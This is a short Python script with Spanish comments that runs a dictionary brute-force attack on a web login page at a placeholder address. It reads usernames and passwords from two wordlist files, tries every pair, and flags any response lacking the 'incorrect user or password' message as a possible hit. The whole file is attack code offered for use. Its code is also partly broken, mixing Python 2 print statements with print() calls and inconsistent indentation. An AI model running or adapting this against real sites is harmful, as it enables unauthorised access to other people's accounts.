import requests
import ssl
from io import BytesIO

#Direccion de pagina WEB
url="https://dominio.com/login"
print ('Inicia proceso')
#filepath aqui va la ruta del archivo que ocuparemos para diccionario de usuarios
#filepath2 aqui va la ruta del archivo que ocuparemos para diccionario de contraseñas
filepath = 'diccionario_usuario.txt'
filepath2 = 'dic_pas.txt'
with open(filepath) as fp:
   line = fp.readline()
   cnt = 1
   while line:
       print(line.strip())
       usr=''+line.strip()
       pas=''
       with open(filepath2) as fp2:
          line2 = fp2.readline()
          cnt2 = 1
          while line2:
              pas=''+line2.strip()
              data = {"username": usr, "password": pas}
              print url
              print data
              get_body=''
              get_body = requests.get(url, data).text
			  #aqui puedes buscar una cadena especifica en la cadena que regresa 
              if (get_body.find('Usuario o Contraseña incorrecto') != -1 ):
                   print ("---> MENSAJE DATOS INCORRECTOS")
				   #print (get_body)
              else:
                   print ("-------------------------------------->>>OTRA RESPUESTA")
                   #print (get_body)
              line2 = fp2.readline()
              cnt2 += 1
       line = fp.readline()
       cnt += 1